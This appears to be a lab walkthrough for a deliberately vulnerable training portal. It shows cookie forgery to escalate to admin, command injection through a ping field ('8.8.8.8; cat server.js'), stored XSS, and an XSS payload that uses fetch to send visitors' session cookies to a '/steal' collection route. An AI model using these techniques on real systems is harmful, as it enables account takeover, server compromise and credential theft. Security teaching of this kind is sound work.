# Hacking the Corporate Portal (Advanced)

## 1. Broken Authentication (Privilege Escalation)
**Goal:** Become Admin without the password.

1.  **Log in** as `student` / `student123`.
2.  Open **Developer Tools** (F12) -> **Application** -> **Cookies**.
3.  Copy the value of the `session_data` cookie. It will look like a Base64 string (e.g., `eyJ1c2VybmFtZSI6InN0dWRlbnQiLCJyb2xlIjoidXNlciJ9`).
4.  **Decode** the Base64 value:
    - You can use an online decoder or browser console: `atob("YOUR_COOKIE_VALUE")`.
    - Result: `{"username":"student","role":"user"}`
5.  **Modify** the JSON: change `"role":"user"` to `"role":"admin"`.
    - New JSON: `{"username":"student","role":"admin"}`
6.  **Encode** it back to Base64:
    - Console: `btoa('{"username":"student","role":"admin"}')`
    - Result: `eyJ1c2VybmFtZSI6InN0dWRlbnQiLCJyb2xlIjoiYWRtaW4ifQ==`
7.  **Replace** the cookie value in DevTools with your new admin cookie.
8.  **Refresh** the page. You will see the red "Admin Tools" link in the menu.

## 2. Command Injection (RCE)
**Goal:** Execute shell commands on the server.

1.  Navigate to `/admin/tools` (must be Admin via Step 1).
2.  In the "Ping Server Utility" input, trying pinging Google: `8.8.8.8`. It works.
3.  Now, append a system command using a semicolon `;`.
4.  Payload: `8.8.8.8; ls -la` (List files) or `8.8.8.8; cat server.js` (Read source code).
5.  **Execute**. You will see the file listing in the console output window below.

## 3. Stored XSS
**Goal:** Plant a trap for other users.

1.  Go to the Dashboard (`/dashboard`).
2.  In the "Write something on the wall..." box, enter malicious JavaScript:
    ```html
    <script>
      document.body.style.backgroundColor = 'red';
      alert('HACKED BY ' + document.cookie);
    </script>
    ```
3.  **Post** the comment.
4.  Now, every time *anyone* (including the Admin) visits the Dashboard, that script will execute immediately because the comment is saved and rendered unsanitized.

## 4. C2 Exploitation (Command & Control) 🕵️‍♂️
**Goal:** Exfiltrate data and harvest credentials.

### Part A: Credential Harvesting
1.  Go to `/login`.
2.  Try to log in with fake credentials (e.g., `admin` / `admin`).
3.  Open the Hacker Dashboard at `/darkweb` in a new tab.
4.  **Success!** You will see the failed login attempt logged in real-time.

### Part B: Data Exfiltration via XSS
1.  Combine the **Stored XSS** vulnerability with the C2 **Spy Route**.
2.  Post the following payload in the Dashboard comments:
    ```html
    <script>
      fetch('/steal?data=' + document.cookie + '&type=cookie');
    </script>
    ```
3.  Now, whenever a user visits the dashboard, their browser silently sends their **session cookie** to your C2 server.
4.  Check `/darkweb` to see the stolen cookies flooding in!
